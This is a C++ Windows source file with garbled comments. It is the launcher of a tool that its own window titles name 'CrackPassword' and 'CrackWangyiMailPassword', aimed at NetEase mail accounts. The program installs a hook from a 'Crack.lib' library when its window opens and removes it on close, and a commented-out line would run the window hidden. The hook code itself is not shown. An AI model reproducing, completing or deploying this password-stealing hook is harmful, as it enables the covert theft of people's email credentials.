#include<Windows.h>
#include "resource.h"
#pragma comment(lib, "Crack.lib")

//��װ����
extern "C" __declspec(dllimport) BOOL InstallHook();

//ж�ع���
extern "C" __declspec(dllimport) BOOL UninstallHook();

//���ڴ�����
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam);


//main����������̨���ڳ���
//WinMain������Windows����



//__stdcall ��ͬWINAPI	HINSTANCE ʵ�����   LPSTR �����в���  nCmdShow������ʾ��ʽ
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPreInstance, LPSTR lpCmdLine, int nCmdShow) {
	//����һ������
	TCHAR szAppClassName[] = TEXT("CrackPassword");

	WNDCLASS wndClass;
	wndClass.cbClsExtra = 0;		//���������չ�ռ��С
	wndClass.cbWndExtra = 0;		//���ڵ���չ�ڴ��С
	wndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);	//���ذ�ɫ����
	wndClass.hCursor = LoadCursor(NULL, IDC_ARROW);		//���ع��
	wndClass.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));		//����ͼ��
	wndClass.hInstance = hInstance;		//ʵ�����
	wndClass.lpfnWndProc = WindowProc;		//���ڴ�����
	wndClass.lpszClassName = szAppClassName;	//����������
	wndClass.lpszMenuName = NULL;		//�˵���
	wndClass.style = CS_HREDRAW | CS_VREDRAW | CS_DBLCLKS;	//��ķ��

	//ע�ᴰ����
	RegisterClass(&wndClass);

	//��������	lpClassName, lpWindowName, dwStyle, x, y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam
	HWND hWnd = CreateWindow(
		szAppClassName,				//����������
		TEXT("CrackWangyiMailPassword"),	//���ڱ���
		WS_OVERLAPPEDWINDOW,		//���ڵķ��
		400,						//�������ϽǺ�����
		200,						//�������Ͻ�������
		600,						//���ڵĿ��
		400,						//���ڵĸ߶�
		NULL,						//�����ھ��
		NULL,						//�˵����
		hInstance,					//ʵ�����
		NULL						//����
		);

	//��ʾ����
	//ShowWindow(hWnd, SW_HIDE);	//���س������д���
	ShowWindow(hWnd, SW_SHOW);		//��ʾ�������д���
	UpdateWindow(hWnd);


	//��Ϣѭ��
	MSG msg;	//WM_QUIT
	while (GetMessage(&msg, NULL, 0, 0)) {
		//���������Ϣ��Ϊ�ַ���Ϣ
		TranslateMessage(&msg);

		//����Ϣ�ַ������ڴ�����
		DispatchMessage(&msg);
	}

	return 0;
}

//���ڴ�����
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	switch (uMsg)
	{
	case WM_CREATE:		//���ڴ�����Ϣ
		InstallHook();
		break;
	case WM_CLOSE:	//���ڹر���Ϣ
		DestroyWindow(hWnd);
		break;
	case WM_DESTROY:	//���ٴ���
		UninstallHook();
		PostQuitMessage(0);
		break;
	default:
		break;
	}
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}